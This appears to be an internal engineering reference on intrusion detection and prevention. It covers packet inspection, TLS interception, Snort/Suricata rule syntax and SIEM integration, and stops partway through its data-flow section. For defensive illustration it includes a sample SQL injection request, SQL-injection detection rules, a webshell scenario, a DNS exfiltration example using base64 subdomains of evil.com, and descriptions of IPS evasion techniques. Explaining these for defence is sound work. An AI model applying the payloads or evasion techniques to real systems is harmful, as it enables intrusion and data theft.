# Intrusion Detection / Prevention System (IDS/IPS) — Deep Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Reference
> **Audience:** Security Engineers, Network Architects, SOC Analysts, Interview Candidates
> **Scope:** Full-stack, packet-level, operationally-complete breakdown of modern IDS/IPS systems
> **Systems Covered:** Network IDS/IPS (NIDS/NIPS), Host IDS/IPS (HIDS/HIPS), Snort/Suricata rule mechanics, SIEM integration, inline vs. passive deployment

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios](#9-attack-scenarios)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### Scenario A: Attacker Executes a SQL Injection — IPS Blocks It

This narrative follows two simultaneous perspectives: what the attacker sees and what happens inside every system component.

---

### T=0ms — Attacker sends a crafted HTTP request

**What the attacker sees:** They send:
```
GET /products?id=1' OR '1'='1 HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
```
Their browser (or `curl`) initiates a TCP connection to `shop.example.com:443`.

**What actually happens — network path:**

1. The attacker's packet leaves their machine, traverses the internet, and arrives at the organization's **perimeter router**.
2. The router forwards the packet to the **inline IPS appliance** (or software running on a dedicated inspection node). In an inline deployment, the IPS physically sits in the traffic path — every packet passes through it before reaching any internal system.
3. The IPS's **packet capture engine** (using DPDK, AF_PACKET, or a hardware NIC in promiscuous mode) captures the raw packet from the wire at line rate.

---

### T=~0.1–2ms — IPS Packet Inspection Pipeline

**What the attacker sees:** Slight latency. Nothing yet.
**What actually happens:**

1. **Layer 2–4 decoding:** The IPS decodes Ethernet frame → IP header → TCP header. It notes: source IP, destination IP, source port, destination port, TCP flags, sequence numbers.
2. **Flow reassembly:** The IPS checks its **session/flow table** (a hash map keyed on 5-tuple: src_ip, dst_ip, src_port, dst_port, protocol). If this is an existing TCP connection, the packet is added to the reassembled stream. If new, a new flow entry is created.
3. **TCP stream reassembly:** TCP can fragment application data across multiple packets. The IPS must reassemble the full TCP stream before applying application-layer rules. Sequence number gaps are tracked; out-of-order packets are buffered.
4. **TLS decryption (if applicable):** If the IPS has TLS inspection enabled, it performs a man-in-the-middle decryption using an installed CA certificate. The decrypted payload is passed to the inspection engine. If TLS inspection is not configured, the IPS can only inspect metadata (IP/TCP headers, TLS SNI), not payload content.
5. **Protocol detection:** The IPS identifies the application protocol from the port or through protocol identification heuristics (e.g., HTTP keywords in the payload). This triggers the relevant protocol normalizer.
6. **HTTP normalization:** The URL `%27` → `'`, `+` → space, double encoding decoded. This is critical — attackers encode payloads to evade signature matching on the raw bytes.
7. **Rule matching engine:** The normalized payload is run against the rule set.
   - Rule match: `alert http any any -> any any (msg:"SQL Injection - OR 1=1"; content:"OR"; nocase; pcre:"/\d+'\s+OR\s+'[\d]+'\s*=\s*'[\d]+/i"; sid:1000001; rev:1;)`
   - The `pcre` (Perl-Compatible Regular Expression) matches the SQL injection pattern.
8. **Action taken:** In IPS mode (inline), the matching packet is **dropped**. A TCP RST is sent to both sides of the connection, terminating it. The request never reaches the web application server.
9. **Alert generated:** The IPS writes an alert record to its alert queue.

---

### T=~2–5ms — Alert Pipeline

**What the attacker sees:** Connection reset. `curl: (56) Recv failure: Connection reset by peer`.
**What actually happens:**

1. The IPS alert is written to a local buffer (ring buffer or file-based queue).
2. A log shipper (Filebeat, Fluent Bit, or a proprietary agent) reads the alert and forwards it to the **SIEM** (Security Information and Event Management system — Splunk, Elastic SIEM, Microsoft Sentinel, etc.).
3. The SIEM correlates this alert with other events:
   - Has this source IP triggered other alerts in the last 24 hours?
   - Is this source IP in a known-bad threat intelligence feed?
   - Are there other destination IPs being targeted from this source?
4. **SOC analyst view:** Within seconds to minutes (depending on SIEM pipeline latency), an alert appears in the SOC dashboard. The analyst sees:
   - Source IP, destination IP, alert signature name
   - The matched packet content (decoded)
   - Severity: HIGH
   - Recommended action: investigate source IP for active scanning campaign.

---

### Scenario B: Legitimate User Makes a Request — IDS Passthrough

**What the user sees:** Normal website interaction.
**What actually happens:**

1. Same packet capture and flow tracking occurs.
2. TCP stream is reassembled.
3. HTTP normalization runs.
4. Rule matching runs — no signatures match the benign GET request.
5. In **IDS mode (passive/tap)**: the packet was never in the IPS's custody to begin with. The IDS only sees a copy of traffic (via a network TAP or SPAN port). The original packet proceeds to the web server with zero added latency from the IDS.
6. In **IPS mode (inline)**: the IPS forwards the packet to the internal network after inspection. Typical latency added: 0.05–2ms for software IPS; <0.01ms for hardware-accelerated appliances.

---

### Scenario C: HIDS Detects a Post-Exploitation Artifact

A web server has been compromised. An attacker runs `id` and writes a PHP webshell to `/var/www/html/shell.php`.

1. **File integrity monitoring (FIM):** The HIDS agent (OSSEC, Wazuh, Auditbeat) has the `/var/www/html/` directory under inotify watch.
2. `inotify` generates a `IN_CREATE` + `IN_CLOSE_WRITE` event for `shell.php`.
3. The HIDS agent captures: file path, file hash (SHA-256), creating process (PID, parent PID, user), timestamp.
4. The agent checks: is this file hash in the approved baseline? No → alert.
5. **Process lineage alert:** The HIDS also monitors process creation via auditd or eBPF. It detects: `apache2` → `sh` → `id`. Parent process is a web server; spawning a shell is anomalous.
6. Alert sent to SIEM: "Webshell created on web-server-1; parent process: apache2".

---

## 2. Network Layer Flow

### 2.1 Where IDS/IPS Sits in the Network Stack

```
INTERNET
    │
    │ Raw packets (TCP/IP)
    ▼
┌─────────────────────────────┐
│  PERIMETER ROUTER / FIREWALL│
│  - Stateless/stateful L3-L4 │
│  - First packet filter       │
│  - Does NOT deep-inspect     │
└─────────────────┬───────────┘
                  │
        ┌─────────┴──────────┐
        │                    │
        ▼                    ▼
  INLINE IPS MODE      IDS TAP/SPAN MODE
  ┌──────────────┐     ┌──────────────────────┐
  │  IPS Node    │     │  Network TAP          │
  │  (in-path)   │     │  (passive copy)       │
  │              │     │  ┌──────────────────┐ │
  │ ┌──────────┐ │     │  │  IDS Node        │ │
  │ │Inspection│ │     │  │  (out-of-band)   │ │
  │ │ Engine   │ │     │  └──────────────────┘ │
  │ └──────────┘ │     └──────────────────────┘
  │              │
  │  DROP/PASS   │
  └──────┬───────┘
         │
         ▼
  INTERNAL NETWORK
  ┌─────────────────────────────────────────┐
  │  DMZ                                    │
  │  ┌──────────┐  ┌──────────┐             │
  │  │ Web Srv  │  │ App Srv  │             │
  │  └──────────┘  └──────────┘             │
  │                                         │
  │  INTERNAL SEGMENT                       │
  │  ┌──────────┐  ┌──────────┐             │
  │  │ DB Srv   │  │ Auth Srv │             │
  │  └──────────┘  └──────────┘             │
  └─────────────────────────────────────────┘
         │
  ┌──────▼────────────────────────────────┐
  │  SIEM / Alert Management              │
  │  ┌────────────────────────────────┐   │
  │  │ Correlation Engine             │   │
  │  │ Threat Intel Integration       │   │
  │  │ Case Management                │   │
  │  └────────────────────────────────┘   │
  └───────────────────────────────────────┘
```

---

### 2.2 DNS Resolution in the Context of IDS/IPS

DNS is a critical inspection point because:
- **DNS exfiltration:** Attackers encode stolen data in DNS query subdomains (`base64data.attacker.com`).
- **DNS tunneling:** Full C2 communication over DNS queries/responses.
- **DGA (Domain Generation Algorithms):** Malware generates pseudo-random domain names; the IDS flags high-entropy domain lookups.
- **C2 over DNS:** Malware calls home via DNS TXT record responses containing encoded commands.

**DNS traffic path and IDS insertion:**

```
Compromised Host
  │
  ├─ DNS query: GET d29ya2luZw.evil.com TXT?
  │    (base64 encoded data in subdomain)
  │
  ▼
DNS Resolver (internal)
  │
  │  ← IDS inspects HERE (DNS query is unencrypted UDP/53 or TCP/53)
  │    Rules check:
  │    - Subdomain entropy (Shannon entropy > 3.5 → suspicious)
  │    - Subdomain length (> 50 chars → suspicious)
  │    - Query rate (> 100 unique subdomains/min → tunneling)
  │    - Reputation of apex domain (threat intel lookup)
  │
  ▼
Recursive Resolver (ISP or 8.8.8.8)
  │
  ▼
Authoritative NS for evil.com (attacker-controlled)
  │
  ← Response contains encoded C2 command in TXT record
  │
  ▼
Back to compromised host
  │
  ← IDS inspects RESPONSE too:
      - TXT record length > typical (C2 commands are often long)
      - Base64/hex patterns in TXT records
      - NXDOMAIN rate (DGA malware tries many non-existent domains)
```

**Key IDS/IPS DNS signatures:**
- Shannon entropy calculation on FQDN (legitimate domains have low entropy; DGA domains have near-random character distribution)
- Query per second (QPS) per internal host to a single apex domain (tunneling = many queries)
- Ratio of unique subdomains queried (DGA = each query to a different subdomain)
- DNS-over-HTTPS (DoH) detection: HTTP/2 traffic to port 443 with `application/dns-message` content type — bypasses DNS inspection entirely

---

### 2.3 TCP Three-Way Handshake — IPS Interception Points

```
ATTACKER                    IPS (inline)               WEB SERVER
    │                           │                           │
    ├── SYN ──────────────────►│                           │
    │                           │ IPS creates flow entry    │
    │                           │ Checks: SYN flood?        │
    │                           │ Source IP reputation?     │
    │                           │ Port allowed?             │
    │                           │                           │
    │                           ├── SYN ──────────────────►│
    │                           │◄── SYN-ACK ──────────────┤
    │◄── SYN-ACK ───────────────┤                           │
    │                           │                           │
    ├── ACK ──────────────────►│                           │
    │                           ├── ACK ──────────────────►│
    │                           │                           │
    │    [Connection Established — IPS tracks state]        │
    │                           │                           │
    ├── HTTP GET (malicious) ──►│                           │
    │                           │  INSPECT + MATCH RULE     │
    │                           │  Action: DROP             │
    │◄── TCP RST ───────────────┤                           │
    │                           ├── TCP RST ──────────────►│
    │                           │  (tear down both sides)   │
```

**TCP-level evasion techniques the IPS must handle:**

1. **TCP Segmentation:** Attacker splits the payload across multiple TCP segments. `GET /` in segment 1, `products?id=1' OR` in segment 2. The IPS must reassemble the full stream before pattern matching.

2. **TCP Overlapping Segments:** Attacker sends two overlapping TCP segments with different sequence numbers. The IPS and the target OS may disagree on which segment "wins" (based on OS behavior for overlapping data). If they pick differently, the attacker constructs a payload that looks benign to the IPS but is malicious to the target. Modern IPS handles this by normalizing to one consistent behavior (typically: first-seen wins, or last-seen wins — must match target OS behavior).

3. **SYN Cookies vs. IPS State:** Under SYN flood, the web server may use SYN cookies (encodes state in the sequence number rather than allocating memory). The IPS must understand SYN cookies to correctly track such connections.

4. **TTL manipulation:** Attacker sends a packet with TTL=1 that will expire before reaching the server but that the IPS processes. The IPS sees a "benign" packet; the next packet (with the actual malicious content) arrives with a different TTL. A naive IPS may apply the inspection to the wrong segment.

---

### 2.4 TLS Inspection — The Deep Problem

Modern HTTPS encrypts the payload. An IPS that cannot inspect TLS payload is essentially blind to application-layer attacks delivered over HTTPS.

**TLS Inspection (SSL/TLS Interception) Architecture:**

```
CLIENT                    IPS (TLS Proxy)                  SERVER
  │                             │                              │
  │── ClientHello ────────────►│                              │
  │   SNI: shop.example.com     │  IPS checks SNI against     │
  │                             │  bypass list (banking,       │
  │                             │  healthcare domains bypass)  │
  │                             │                              │
  │                             │── ClientHello ─────────────►│
  │                             │◄── ServerHello+Cert ─────────┤
  │                             │                              │
  │                             │  IPS validates server cert   │
  │                             │  IPS creates its OWN cert:   │
  │                             │  CN=shop.example.com         │
  │                             │  Signed by IPS internal CA   │
  │                             │                              │
  │◄── ServerHello+FAKE_Cert ───┤                              │
  │    (signed by IPS CA)        │                              │
  │                             │                              │
  │  Client trusts IPS CA        │                              │
  │  (pushed via GPO/MDM)        │                              │
  │                             │                              │
  │═══ TLS Session (Client↔IPS)═│═══ TLS Session (IPS↔Server)═│
  │                             │                              │
  │  Payload is PLAINTEXT        │                              │
  │  inside IPS — inspected      │                              │
  │  by rule engine              │                              │
```

**TLS inspection constraints and failures:**
- **Certificate pinning:** Mobile apps and some browsers pin server certificates. They will detect the IPS-issued certificate as fraudulent and reject the connection. These apps must be excluded from TLS inspection.
- **Client certificates (mTLS):** If the server requires a client certificate, the IPS cannot present the client's certificate to the server (it doesn't hold the private key). mTLS connections must bypass TLS inspection.
- **ESNI/ECH (Encrypted Client Hello):** Emerging TLS extension that encrypts the SNI field. If ECH is used, the IPS cannot even read the hostname to apply bypass rules — it sees encrypted SNI.
- **Compliance:** Inspecting TLS in environments handling medical, legal, or financial data may violate privacy regulations (HIPAA, GDPR). Separate network segments for sensitive traffic with bypass rules are required.
- **Performance:** TLS inspection requires two full TLS handshakes per connection and continuous encryption/decryption. This is 5–10× more CPU-intensive than simple packet forwarding. Hardware acceleration (Intel QuickAssist, Cavium NITROX) is required at scale.

---

### 2.5 Latency Budget for Inline IPS

| Operation | Typical Duration |
|-----------|-----------------|
| Packet capture from NIC | <0.01ms (DPDK, kernel-bypass) |
| Flow lookup in session table | <0.01ms (hash table, hot cache) |
| TCP reassembly | 0.01–0.1ms (in-order packets) |
| TLS decryption (if enabled) | 0.1–1ms per new session |
| Protocol normalization | 0.01–0.1ms |
| Rule matching (no regex) | 0.1–1ms (multi-pattern string search) |
| Rule matching (PCRE) | 1–10ms (complex regex on large payloads) |
| **Total (no TLS inspection)** | **0.1–2ms per packet/flow** |
| **Total (with TLS inspection)** | **1–10ms per new session** |

For comparison: a transatlantic RTT is ~80ms. The IPS latency is negligible relative to network latency for most deployments. However, for low-latency internal applications (HFT, real-time databases), even 1ms added latency is significant.

---

## 3. Application Layer Flow

### 3.1 HTTP Inspection Pipeline

The IPS's HTTP protocol handler must understand HTTP to correctly normalize and inspect it.

```
Raw TCP Stream (reassembled bytes)
  │
  ▼
HTTP Request Parser
  ├── Request line: method, URI, HTTP version
  ├── Header parsing: key: value pairs (case-insensitive keys)
  ├── Body: if Content-Length or Transfer-Encoding: chunked
  │
  ▼
URI Normalization
  ├── Percent-decode: %27 → '  %3D → =  %0A → \n
  ├── Double-decode: %2527 → %27 → '
  │     (attackers encode twice to evade single-pass decoders)
  ├── Unicode normalization: ＜ (fullwidth less-than) → <
  ├── Path traversal normalization: /../../etc → /etc
  ├── Backslash normalization (Windows paths): /..\..\windows → normalized
  ├── Null byte removal: /admin%00.jpg → /admin
  └── Remove redundant slashes, dots: /./././admin → /admin
  │
  ▼
Header Normalization
  ├── Lowercase all header names
  ├── Unfold multi-line headers (RFC 7230 obsolete folding: \r\n SP → SP)
  ├── Multiple Content-Type headers: use last (per RFC) — evasion via first
  └── Transfer-Encoding abuse: chunked encoding with extra extensions
  │
  ▼
Body Parsing (content-type aware)
  ├── application/x-www-form-urlencoded: decode key=value&key=value
  ├── multipart/form-data: parse MIME boundaries, extract parts
  ├── application/json: parse JSON tree for injection patterns
  ├── application/xml: parse XML, check for XXE patterns (DOCTYPE, ENTITY)
  └── Binary: extract metadata, check magic bytes
  │
  ▼
Rule Matching Engine
  ├── Fast content matching (Aho-Corasick multi-pattern search)
  │     Simultaneously searches for thousands of byte patterns
  │     Time complexity: O(n) in input length, regardless of rule count
  │
  ├── PCRE engine (for complex patterns)
  │     Run only when fast patterns match first (to reduce PCRE invocations)
  │     Time complexity: can be O(n²) or worse for pathological regexes
  │
  └── Lua/JavaScript scripting (for complex stateful logic)
        Some engines allow custom scripts for multi-step detection
```

---

### 3.2 Protocol Anomaly Detection vs. Signature Matching

IDS/IPS inspection strategies:

**Signature-based detection:**
- Matches known attack patterns (exploit code, shellcode bytes, known CVE payloads).
- Low false positive rate for known attacks.
- Zero protection against novel (zero-day) attacks.
- Rule databases: Snort rules, Suricata rules, Emerging Threats (ET Pro/Open), commercial rule sets (Talos, ProofPoint).

**Protocol anomaly detection:**
- Define a baseline of "valid" protocol behavior. Alert on deviations.
- Example: RFC 7230 says HTTP method tokens are uppercase alphabetic characters. Alert on methods containing non-standard characters.
- Example: HTTP/1.1 requires a `Host` header. A request without `Host` is anomalous (possible evasion attempt or vulnerability scanner).
- Example: A `Content-Length` of 0 with a non-empty body is a protocol violation.
- Higher false positive rate. Requires tuning per environment.

**Statistical/behavioral detection:**
- Baseline normal traffic patterns over time. Alert on deviations from the baseline.
- Example: This server normally receives 1,000 requests/hour. It's receiving 100,000 requests/hour → DDoS or vulnerability scan.
- Example: This internal host normally initiates 10 outbound connections/hour. It's initiating 10,000 → worm propagation or data exfiltration.
- Requires a learning period. Can be evaded by attackers who operate "low and slow."

---

### 3.3 Snort/Suricata Rule Anatomy — Deep Dive

Every rule defines what to look for and what to do when found:

```
action  proto  src_ip  src_port  direction  dst_ip  dst_port  (options)

alert   tcp    $EXTERNAL_NET  any  ->  $HTTP_SERVERS  $HTTP_PORTS  \
(
  msg:"ET WEB_SERVER SQL Injection Attempt -- OR 1=1";
  flow:established,to_server;
  content:"OR"; nocase; http_uri;
  content:"="; distance:1; within:5; http_uri;
  pcre:"/(\d+|'[\w]+')\s+OR\s+(\d+|'[\w]+')\s*=\s*(\d+|'[\w]+')/Ui";
  reference:cve,2008-7320;
  classtype:web-application-attack;
  sid:2006445;
  rev:7;
)
```

**Option breakdown:**

- `msg`: Human-readable alert description. Appears in SIEM alerts.
- `flow:established,to_server`: Only inspect packets in an established TCP connection, going from client to server. Prevents alerting on server responses or SYN packets.
- `content:"OR"; nocase; http_uri;`: Search for the string "OR" (case-insensitive) in the normalized HTTP URI. `http_uri` applies the HTTP URI normalization buffer — the content is checked against the decoded URI, not the raw bytes.
- `content:"="; distance:1; within:5;`: After finding "OR", look for "=" within 5 bytes, starting at least 1 byte after "OR". This chained content matching avoids the full PCRE for simple cases.
- `pcre:"/pattern/Ui"`: Perl-Compatible Regular Expression. `U` = enable HTTP URI normalization for PCRE (same buffer as `http_uri`). `i` = case-insensitive.
- `reference:cve,2008-7320`: Links alert to CVE database entry.
- `classtype:web-application-attack`: Categorization for SIEM correlation.
- `sid:2006445`: Unique rule identifier. Snort SIDs < 1,000,000 are official Snort rules. SIDs starting with 2000000 are Emerging Threats rules.
- `rev:7`: Rule revision. When a rule is updated (e.g., tuned to reduce false positives), the revision increments.

---

### 3.4 HTTP Response Inspection

IDS/IPS also inspects server responses — looking for data exfiltration, server errors revealing internal information, and malware delivery:

**Response inspection use cases:**
- **Credit card number detection:** Regex matching PAN patterns (16-digit numbers matching Luhn checksum) in HTTP response bodies.
- **Error disclosure:** `500 Internal Server Error` with stack trace in body → reveals technology stack, file paths, variable names. Alert and strip from response in IPS mode.
- **Malware delivery:** A JavaScript snippet in the HTML response contains drive-by download code. Match against malware signatures.
- **Data loss prevention (DLP):** Match response body against patterns: SSNs, email addresses, confidential document markers.

**Response inspection constraints:**
- Response bodies can be gzipped (`Content-Encoding: gzip`). The IPS must decompress before inspection.
- Response bodies can be chunked. The IPS must reassemble chunks.
- For large file downloads (GB-scale), full body inspection is impractical — IPS may inspect only the first N kilobytes.

---

## 4. Backend Architecture

### 4.1 Full IDS/IPS + SIEM Architecture

```
                    TRAFFIC SOURCES
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐            │
  │  │ North-   │  │ East-    │  │ Cloud    │            │
  │  │ South    │  │ West     │  │ (VPC Flow│            │
  │  │ Traffic  │  │ Traffic  │  │  Logs)   │            │
  │  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
  └───────┼─────────────┼─────────────┼──────────────────┘
          │             │             │
  ┌───────▼─────────────▼─────────────▼──────────────────┐
  │  SENSOR / CAPTURE LAYER                               │
  │                                                       │
  │  ┌──────────────┐  ┌───────────────┐                 │
  │  │ Network TAP  │  │ SPAN/Mirror   │                 │
  │  │ (passive,    │  │ Port (switch- │                 │
  │  │  no latency) │  │  configured)  │                 │
  │  └──────┬───────┘  └──────┬────────┘                 │
  │         │                 │                           │
  │  ┌──────▼─────────────────▼─────────────────────┐    │
  │  │  Packet Broker / Traffic Aggregator           │    │
  │  │  - De-duplication (SPAN can duplicate)        │    │
  │  │  - Load balancing across IDS sensors          │    │
  │  │  - Protocol filtering before sensors          │    │
  │  └──────────────────────┬────────────────────────┘    │
  └─────────────────────────┼──────────────────────────────┘
                            │
  ┌─────────────────────────▼──────────────────────────────┐
  │  INSPECTION ENGINE (Suricata / Snort / Commercial)     │
  │                                                        │
  │  ┌─────────────────────────────────────────────────┐  │
  │  │  Packet Capture Thread (AF_PACKET / DPDK)       │  │
  │  │  → Ring buffer → Worker threads (per CPU core)  │  │
  │  └─────────────────────────────────────────────────┘  │
  │                                                        │
  │  ┌─────────────────────────────────────────────────┐  │
  │  │  Flow/Session Tracker                           │  │
  │  │  Hash table: 5-tuple → flow state               │  │
  │  │  TCP reassembly per flow                        │  │
  │  └─────────────────────────────────────────────────┘  │
  │                                                        │
  │  ┌─────────────────────────────────────────────────┐  │
  │  │  Protocol Decoders                              │  │
  │  │  HTTP, DNS, TLS, FTP, SMTP, SSH, SMB, ...       │  │
  │  └─────────────────────────────────────────────────┘  │
  │                                                        │
  │  ┌─────────────────────────────────────────────────┐  │
  │  │  Rule Engine (Aho-Corasick + PCRE)              │  │
  │  │  Rule set: 50,000–100,000 rules                 │  │
  │  └─────────────────────────────────────────────────┘  │
  │                                                        │
  │  ┌─────────────────────────────────────────────────┐  │
  │  │  Output Modules                                 │  │
  │  │  - Alert log (JSON / EVE format)                │  │
  │  │  - PCAP capture (full packet for matched flows) │  │
  │  │  - Syslog (UDP/TCP to SIEM)                     │  │
  │  │  - Unix socket (to local SIEM agent)            │  │
  │  └─────────────────────────────────────────────────┘  │
  └────────────────────────────┬───────────────────────────┘
                               │
  ┌────────────────────────────▼───────────────────────────┐
  │  LOG SHIPPING LAYER                                    │
  │  Filebeat / Fluent Bit / rsyslog                       │
  │  - Tail alert log file                                 │
  │  - Parse, enrich, batch                               │
  │  - Forward to SIEM ingestion endpoint                  │
  └────────────────────────────┬───────────────────────────┘
                               │
  ┌────────────────────────────▼───────────────────────────┐
  │  SIEM / SECURITY DATA LAKE                             │
  │  (Splunk / Elastic SIEM / Sentinel / QRadar)           │
  │                                                        │
  │  ┌───────────────────────────────────────────────┐    │
  │  │  Ingestion Pipeline                           │    │
  │  │  - Schema normalization (ECS / OCSF / CEF)   │    │
  │  │  - Deduplication                             │    │
  │  │  - Enrichment (GeoIP, threat intel, asset DB)│    │
  │  └───────────────────────────────────────────────┘    │
  │                                                        │
  │  ┌───────────────────────────────────────────────┐    │
  │  │  Correlation Engine                           │    │
  │  │  - Rules: "3 alerts from same IP in 5 min"   │    │
  │  │  - ML models: anomaly detection               │    │
  │  │  - Threat Intel matching                     │    │
  │  └───────────────────────────────────────────────┘    │
  │                                                        │
  │  ┌───────────────────────────────────────────────┐    │
  │  │  Storage                                      │    │
  │  │  - Hot: Elasticsearch / Splunk indexes        │    │
  │  │  - Warm: slower indexes, 30–90 days           │    │
  │  │  - Cold: S3 / GCS for long-term retention     │    │
  │  └───────────────────────────────────────────────┘    │
  └────────────────────────────┬───────────────────────────┘
                               │
  ┌────────────────────────────▼───────────────────────────┐
  │  SOC OPERATIONS                                        │
  │  - Alert queue and triage                              │
  │  - Incident response workflows (SOAR)                  │
  │  - Threat hunting                                      │
  │  - Rule tuning feedback loop                           │
  └────────────────────────────────────────────────────────┘
```

---

### 4.2 Suricata Multi-Threading Architecture

Suricata (the dominant open-source IPS engine) uses a worker-thread model:

```
NIC Receive Queues (RSS - Receive Side Scaling)
  Queue 0 → CPU Core 0 → Worker Thread 0
  Queue 1 → CPU Core 1 → Worker Thread 1
  Queue 2 → CPU Core 2 → Worker Thread 2
  Queue N → CPU Core N → Worker Thread N

Each Worker Thread:
  ┌────────────────────────────────────────────────┐
  │  Packet Acquire (from NIC queue)               │
  │         ↓                                      │
  │  Decode (Ethernet → IP → TCP/UDP/ICMP)         │
  │         ↓                                      │
  │  Flow Lookup / Create (per-thread hash tables) │
  │         ↓                                      │
  │  Stream Reassembly                             │
  │         ↓                                      │
  │  App Layer Parser (HTTP/DNS/TLS/etc.)          │
  │         ↓                                      │
  │  Detect Engine (signatures)                    │
  │         ↓                                      │
  │  Outputs (alert, drop, pcap)                   │
  └────────────────────────────────────────────────┘

Shared State (protected by atomic ops / locks):
  - Global flow table (flows can be rebalanced between threads)
  - Rule set (read-only after load; hot-reload requires brief lock)
  - Reputation data (threat intel IPs/domains)
```

**Flow pinning:** Each TCP flow is consistently processed by the same worker thread (based on a hash of the 5-tuple). This avoids locking on per-flow state (reassembly buffers, protocol state machines) because only one thread ever touches a given flow.

---

### 4.3 Sync vs. Async Flows in IPS

**Synchronous (inline IPS):**
- The original packet is held in a kernel or userspace queue.
- The inspection engine runs and makes a PASS/DROP decision.
- The packet is either forwarded or dropped.
- The entire inspection chain must complete before the packet is released.
- Latency impact is direct: slow inspection = network slowdown.

**Asynchronous (IDS passive / tap mode):**
- The IDS processes a copy of the packet.
- The original packet continues to its destination unimpeded.
- Alerts are generated and sent to SIEM.
- The IDS cannot block attacks — it can only alert.
- Alert pipeline latency (IDS → SIEM → SOC → manual block) may be minutes to hours. An attacker may complete their objective before any block is enacted.

**Hybrid (IDS with active response):**
- IDS operates in passive mode for inspection.
- When a rule fires, the IDS sends a TCP RST to both parties to terminate the connection.
- The TCP RST arrives after the malicious packet has already reached the server — there is a race between the malicious request being processed and the RST arriving. The server may have already acted on the malicious input.

---

### 4.4 Threat Intelligence Integration

```
External Threat Intel Sources
  ├── Commercial feeds (Recorded Future, Mandiant, CrowdStrike)
  ├── Open-source (AlienVault OTX, Abuse.ch, EmergingThreats)
  ├── Government (US-CERT, NCSC, ISACs)
  └── Internal (your own incident history)
         │
         ▼ (STIX/TAXII format or proprietary)
  Threat Intel Platform (TIP)
  (MISP, ThreatConnect, Anomali)
         │
         ├──► IPS: IP/domain reputation lists
         │         Rules updated based on IOCs
         │
         ├──► SIEM: enrichment lookups
         │         Alert score boosted if IP matches TI
         │
         └──► EDR: file hash, process indicators
                   Behavioral IOCs

Update cadence:
  - IP reputation: every 5–30 minutes (IPs change frequently)
  - Domain reputation: hourly
  - File hashes (malware): real-time push via STIX
  - PCRE signatures: daily or on-demand after CVE disclosure
```

---

## 5. Authentication & Authorization Flow

### 5.1 IDS/IPS Management Plane Security

The IDS/IPS itself has an attack surface: its management interface. Compromising the management plane lets an attacker disable detection, modify rules, or exfiltrate captured traffic.

**Management plane components:**
- Web UI (configuration, rule management, alert viewing)
- REST API (programmatic rule updates, SIEM integration)
- SSH CLI (administrative access to the sensor host)
- SNMP (legacy monitoring)

**Authentication requirements:**
- Web UI / REST API: mutual TLS (mTLS) + username/password or API key.
- API keys stored in secrets manager (Vault, AWS Secrets Manager).
- SSH: key-based auth only. Password auth disabled. Keys rotated quarterly.
- SNMP: SNMPv3 with authentication and encryption (avoid SNMPv1/v2c — community strings are cleartext).

**Authorization (RBAC):**
```
Roles:
  ├── Viewer: can read alerts, dashboards. Cannot modify rules.
  ├── Analyst: can acknowledge alerts, add suppressions. Cannot add rules.
  ├── Rule Author: can add/modify rules. Cannot modify system config.
  ├── Admin: full access including system config, user management.
  └── Break-Glass: emergency override, all access, session logged.

Trust boundaries:
  - Management traffic on separate VLAN/interface
  - Management interface not accessible from internet
  - Jump host / bastion required for SSH to sensors
  - 2FA required for Web UI and API
```

---

### 5.2 SIEM Authentication and Data Trust

The SIEM receives data from many sources. Each source is a potential injection vector:

```
IDS Sensor → [logs] → Log Shipper → SIEM

Trust concern: Can an attacker inject fake alerts?
  - If IDS logs are written to a world-writable file, an attacker
    with local access could inject fake alerts (or delete real ones).
  - Mitigate: log integrity (syslog with TLS to remote server;
    write-once log storage; log signing).

Trust concern: Can an attacker overwhelm the SIEM with fake alerts?
  - Alert flooding: if attacker triggers 100M alerts, SIEM storage
    fills up, real alerts are lost.
  - Mitigate: rate limiting at the shipper; alert deduplication;
    tiered storage with alert throttling.

Token / credential rotation for SIEM API:
  - IDS sensors authenticate to SIEM using API tokens.
  - Tokens stored in environment variables or secrets manager.
  - Tokens rotated every 90 days or on suspected compromise.
  - Minimum scope: write to specific index only (not read, not delete).
```

---

### 5.3 Rule Signing and Integrity

Rule updates are a critical supply-chain attack surface. A compromised rule update could:
- Add rules that alert on legitimate traffic (causing operational disruption).
- Remove rules covering specific CVEs the attacker plans to exploit.
- Add rules with embedded backdoors (a rule that exfiltrates matched packet content).

**Mitigations:**
- Rule packages signed by the vendor (GPG/PGP signature).
- IPS rule loader verifies signature before applying.
- Rule changes go through a change management process (peer review).
- Immutable infrastructure: rule updates deployed via CI/CD pipeline with tested + signed artifacts.
- Staging environment: new rules tested against baseline traffic before production deployment.

---

## 6. Data Flow

### 6.1 Packet Capture to Alert — Complete Data Lifecycle

```
Wire (photons/electrons)
  │
  ▼
NIC Hardware
  ├── Hardware interrupt or polling (DPDK)
  ├── DMA into ring buffer in RAM
  └── RSS: hash 5-tuple → route to specific RX queue
  │
  ▼
Kernel (AF_PACKET) or Userspace (DPDK/PF_RING)
  ├── Packet metadata: timestamp (hardware or software), length, interface
  ├── Raw bytes: Ethernet frame
  └── Zero-copy (where possible): pointer into DMA buffer, no data copy
  │
  ▼
Suricata Decode Module
  ├── Ethernet: src/dst MAC, ethertype
  ├── IP (v4/v6): src/dst IP, protocol, TTL, fragmentation flags
  ├── TCP/UDP/ICMP: ports, flags, sequence numbers, checksum
  └── Decoded into C structures (Packet struct ~500 bytes)
  │
  ▼
Flow Engine
  ├── FlowKey: hash(src_ip, dst_ip, src_port, dst_port, proto)
  ├── Flow lookup: nanosecond hash table lookup
  ├── Flow state: NEW / ESTABLISHED / CLOSED / TIME_WAIT
  └── TCP stream reassembly: out-of-order buffer, gap tracking
  │
  ▼
App Layer Parser
  ├── HTTP: request line, headers, body → HTTPTransaction struct
  ├── DNS: query/response, QTYPE, QNAME → DNSTransaction struct
